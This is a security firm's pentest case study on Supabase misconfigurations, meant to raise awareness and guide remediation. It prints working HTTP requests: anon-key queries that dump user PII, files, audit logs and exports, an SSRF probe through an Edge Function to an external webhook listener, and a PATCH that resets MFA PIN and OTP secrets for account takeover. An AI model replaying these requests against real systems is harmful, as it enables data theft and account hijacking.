---
title: Supabase Leaks, What We Found
author: Punit
date: 2026-02-02 10:10:00 +0100
categories: [Case Study, DTA]
tags: [Case Study, DTA]
image:
  path: https://github.com/user-attachments/assets/8a8d0998-1c14-454f-99d5-504ca2a97daa
  alt: 
render_with_liquid: false
---

In late 2025 and early 2026, the cybersecurity landscape witnessed a disturbing trend involving the mass disclosure of Supabase API keys. This pattern came to a head when **our team** identified a massive leak involving a client who approached us for a **Black Box Pentest**. During this test, a publicly exposed "anonymous" key, often mistakenly treated as harmless by developers, served as the catalyst for a total compromise of the company's customer database.

While this finding highlights the scale of the problem, it represents only the tip of the iceberg regarding this specific class of vulnerability. This case study details a recent engagement with a UK-based SaaS provider where the Cognisys team identified an identical architectural flaw. 

The root cause was not a sophisticated zero-day exploit or a failure in the Supabase platform itself, but a fundamental misunderstanding of the "Shared Responsibility Model" inherent in Backend-as-a-Service (BaaS) platforms. This report outlines the narrative of how a single, intended-to-be-public key allowed our team to map an entire corporate infrastructure, perform Server-Side Request Forgery (SSRF), and ultimately execute a complete account takeover.
## 1. The Primer: Understanding the Supabase Architecture

To understand how a seemingly standard configuration spiralled into a total compromise, one must first grasp the unique architecture of Supabase. Unlike traditional backends, where API endpoints are manually crafted and secured by developers, Supabase operates on a "Backend-as-a-Service" model built directly on top of PostgreSQL. It utilises a tool called PostgREST to automatically expose every table in the database as a RESTful API endpoint.

This architecture relies on a strict dichotomy of access keys. The **Service Role Key** acts as the administrative master key, capable of bypassing all security protocols, and is strictly intended for server-side operations. In contrast, the **Anonymous (Anon) Key** is designed to be public. It lives within the client-side JavaScript of the web application, allowing the browser to initiate connections directly to the database.

Security in this model relies entirely on the interaction between standard SQL permissions and **Row Level Security (RLS)**. By default, Supabase grants the `anon` role access to tables in the public schema to facilitate client-side fetching. This makes RLS the critical "firewall" that lives inside the database tables. When a user requests data using the public Anon key, the database checks the RLS policy to see if that specific user is authorised to view that specific row. If RLS is configured correctly, the system is secure; a user can only query their own data. However, if RLS is misconfigured or disabled, the permissions fall back to the default grants, effectively transforming the Anon key into a skeleton key that allows unrestricted access to every row in the table. 

Finally, for complex logic that cannot run securely in the browser, developers utilise **Edge Functions**. These are serverless functions meant to handle privileged operations. However, as this case study demonstrates, if these functions blindly trust input without validation, they can inadvertently become gateways for server-side attacks like SSRF.

## 2. The Target Environments: A Pattern Across Industries

This case study is not based on a single isolated incident. In fact, we have encountered this exact vulnerability across a multitude of client engagements. However, we have selected two specific examples that best serve today's purpose of spreading awareness: the massive systems of a major global manufacturer and the agile infrastructure of a UK-based SaaS provider. Despite their vast differences in scale, our team observed a striking consistency in the architectural patterns that led to these breaches.

The technical footprints of these compromised environments were nearly identical. They all leveraged Supabase to accelerate development, relying on a modern, "backend-less" stack:

- **Frontend:** React or Next.js Single Page Applications (SPAs) that interact directly with the database.
- **Backend:** Supabase instances handling PostgreSQL storage and auto-generated REST APIs.
- **Logic Layer:** Supabase Edge Functions (Deno) used to handle complex tasks like image processing or data aggregation.
- **Authorisation:** Theoretically managed by Row Level Security (RLS) policies, but in practice, often left in a default or permissive state.

The seductive promise of these platforms, "we handle the backend, you build the product",  engendered a dangerous assumption across all these teams: that the platform was secure "out of the box" without rigorous configuration.
## 3. The Cognisys Approach: 

At Cognisys, we differentiate our methodology by moving beyond automated scanners, which often miss context-specific vulnerabilities. Instead, we adopt a philosophy of "Living in DevTools," analysing client-side code with the mindset of a developer or a dedicated attacker. During this assessment, we began by inspecting the browser's developer console, specifically navigating to the Sources tab to analyse the loaded JavaScript bundles.

We were not looking for complex obfuscated code, but rather for specific integration patterns. We performed targeted searches for strings that typically signal a Supabase integration, such as the default hosting domain `supabase.co` or the universal JWT prefix `eyJ`. Our search quickly yielded a `supabaseConfig` object left exposed in a main JavaScript bundle:
<img width="1062" height="696" alt="Screenshot 2026-02-02 at 1 17 19 PM" src="https://github.com/user-attachments/assets/db58f472-3e8a-4ee4-9efc-eb8ec08f2c18" />

For a tester with a development background, spotting the `supabase.co` domain is a "lightbulb moment." It immediately confirms the technology stack and implies a specific architectural vulnerability: unless explicitly disabled, Supabase exposes a full RESTful API at `/rest/v1/` that mirrors the database schema. Rather than simply decoding the token, we leveraged this knowledge to pivot. We took the base URL found in the configuration, appended the REST endpoint, and authenticated with the anonymous key.
The server responded by returning the entire Open API (Swagger) schema, effectively handing us a detailed map of every table, column, and custom function in the database.

## 4. Exploitation Phase: From Leak to Complete Compromise

With the schema map in hand, we moved from reconnaissance to active exploitation, identifying three distinct critical vulnerabilities.
### The Initial Breach: Enumerating Users

Our first objective was to test the efficacy of the "Bouncer" the Row Level Security (RLS) policies that are supposed to restrict access to the database. Using the information derived from the schema, we bypassed the frontend user interface entirely and issued direct HTTP requests to the `User` table.

A secure implementation would have checked the `auth.uid()` of the requester and returned only the record belonging to that user, or denied the request entirely. However, when we issued the following request, the API returned a status of `200 OK`:

**Request:**

```HTTP
GET /rest/v1/User HTTP/1.1
Host: compromised-db.supabase.co
apikey: [CAPTURED_ANON_KEY]
Authorization: Bearer [CAPTURED_ANON_KEY]
```

**Response:**

```HTTP
HTTP/1.1 200 OK
Content-Type: application/json
[
  {
    "id": "b2c1f8d4-91a3...",
    "email": "emma.thompson@example.com",
    "full_name": "Emma Thompson",
    "phone": "+1-555-0101",
    "role": "user"
  },
  ...
]
```

This payload contained **30K+ user records**. It became immediately apparent that the RLS policies were either misconfigured or entirely absent, exposing massive amounts of Personally Identifiable Information (PII), including names, email addresses, and phone numbers.

### The Deep Dive: Files, Logs, and Corporate Intelligence

One table leads to another. With user data exposed, we pivoted to find what else trusted the anonymous key. We discovered three critical tables that exposed the organisation's inner workings.

#### Uploaded Files

Querying the `Files` table returned metadata for every uploaded document.

**Request:**

```HTTP
GET /rest/v1/Files HTTP/1.1
Host: compromised-db.supabase.co
apikey: [CAPTURED_ANON_KEY]
Authorization: Bearer [CAPTURED_ANON_KEY]
```

**Response:**

```JSON
{
  "bucket": "user-uploads",
  "path": "exports/q4_financial_report.pdf",
  "uploaded_by": "0d3e1c91-77a1-4e4a-8b6c-1f2c9c001001"
}
```

Critically, this metadata allowed us to construct **direct download URLs** using the Supabase storage API, bypassing the need for signed URLs if the bucket is public or RLS is missing on the `storage.objects` table.

**Direct Download:**

```python
https://compromised-db.supabase.co/storage/v1/object/user-uploads/exports/q4_financial_report.pdf
```

#### Audit Logs

Next stop: audit logs. A request to `/rest/v1/AuditLogEvent` exposed user actions, IP addresses, and internal workflows.

**Request:**

```HTTP
GET /rest/v1/AuditLogEvent HTTP/1.1
Host: compromised-db.supabase.co
apikey: [CAPTURED_ANON_KEY]
Authorization: Bearer [CAPTURED_ANON_KEY]
```

**Response:**

```JSON
{
  "user_id": "9b7a12d3-1f23-4f81-b18c-33333202",
  "action": "login_success",
  "ip_address": "203.0.113.45",
  "timestamp": "2025-01-12T08:22:14Z"
}
```

Audit logs reveal **behavioural and operational intelligence**. This kind of data doesn't just show _what_ exists it shows _how the system is used_, providing attackers with a roadmap of administrative activity.
#### Bulk Data Exports

Finally, the most damaging endpoint appeared: `/rest/v1/DataExport`. Instead of scraping raw tables row-by-row, this table pointed us to **pre-packaged exports**.

**Request:**

```HTTP
GET /rest/v1/DataExport HTTP/1.1
Host: compromised-db.supabase.co
apikey: [CAPTURED_ANON_KEY]
Authorization: Bearer [CAPTURED_ANON_KEY]
```

**Response:**

```JSON
{
  "id": "export_0042",
  "file_path": "exports/full_customer_dump_2024_05.csv",
  "status": "ready"
}
```

### The Network Breach: SSRF via Edge Functions

While analysing the schema, we noticed a custom Edge Function named `get-image`. The name itself was revealing, suggesting a utility designed to fetch external resources and process them. We hypothesised that the function took a URL parameter, downloaded the image server-side, converted it to a Base64 string, and returned it to the client.

To test this hypothesis and check for Server-Side Request Forgery (SSRF), we intercepted the request using Burp Suite. We replaced the legitimate image URL with a payload pointing to our own external webhook listener (`webhook.site`).

**Malicious Request:**

```HTTP
GET /functions/v1/get-image?url=[https://webhook.site/6c3c075b](https://webhook.site/6c3c075b)... HTTP/2
Host: compromised-db.supabase.co
apikey: [CAPTURED_ANON_KEY]
```

**Response:**

```HTTP
HTTP/2 200 OK
Content-Type: text/plain

"data:image/jpeg;base64,VGhpcyBpcyBhbiBleHRlcm5hbCB..."
```

The server processed the request without validation and returned a `200 OK` status with a base64 encoded string. Simultaneously, our listener logged an incoming connection from the Supabase server's internal IP address. This confirmed that we could force the server to make arbitrary network requests. In a real-world attack scenario, this capability could be used to scan the client's internal cloud network or access metadata services to steal sensitive cloud credentials.

### The Exploit: Account Takeover

The most critical finding, however, was buried deep within the schema in a table named `UserSecuritySettings`. This table contained highly sensitive columns, specifically `security_pin` and `otp_secret`, which controlled the Multi-Factor Authentication (MFA) settings for users.

Because the RLS misconfiguration extended to this table, we discovered it was not only readable but writable. We targeted a specific user ID identified in our initial enumeration and sent a `PATCH` request attempting to reset their security PIN to `0000` and nullify their OTP secret.

**Attack Request:**

```HTTP
PATCH /rest/v1/UserSecuritySettings?user_id=eq.d9a7b2c1-0e41... HTTP/1.1
Host: compromised-db.supabase.co
apikey: [CAPTURED_ANON_KEY]
Content-Type: application/json

{
  "security_pin": "0000",
  "otp_secret": null
}
```

The server accepted the request with a `204 No Content` response, confirming the change. This effectively granted us "God Mode" access, allowing us to lock out legitimate users, hijack administrative sessions, and bypass authentication mechanisms at will.

## 5. Root Cause Analysis: The "Default-Permissive" Trap

The vulnerabilities identified were not flaws in the Supabase platform itself, but rather failures in implementation. The core issue lies in the configuration of the `anon` role. In Supabase, this role is explicitly granted permissions to tables in the `public` schema to facilitate the 'backend-less' experience.

This architecture creates a dangerous paradox. To prioritise developer velocity, the platform is designed to be **permissive by default**: the `anon` role is automatically granted broad capabilities (`SELECT`, `INSERT`, etc.) so that APIs function the moment a table is created. Security doesn't exist until the developer explicitly activates **Row Level Security (RLS)**. This flips the traditional security model on its head—developers do not need to explicitly _grant_ access to leak data; they must actively _restrict_ it. When RLS is omitted (as with `UserSecuritySettings`) or misconfigured (as with `User`), the system reverts to its open state, turning the public `anon` key into a silent administrative token.

## 6. Remediation Strategy

Following our urgent disclosure, the client worked to implement a comprehensive remediation strategy. We advised them to start by auditing the entire database schema to ensure every single table had RLS enabled with a strict "Default-Deny" policy. We also guided them in binding data policies directly to user identities using `auth.uid()`, ensuring that users could strictly access only the rows that belong to them. To address the network vulnerabilities, we helped them sanitize their Edge Functions by implementing strict domain allow-listing to prevent SSRF attacks. Finally, we recommended immediate invalidation and rotation of the `ANON_KEY` and `SERVICE_ROLE_KEY` to mitigate any scraped credentials.No Exploit - Just Trust in the Wrong Layer!!

The lesson is clear: Modern "backend-less" tools are powerful, but they shift the burden of security from code to configuration. In this new era, your database policy is your firewall.

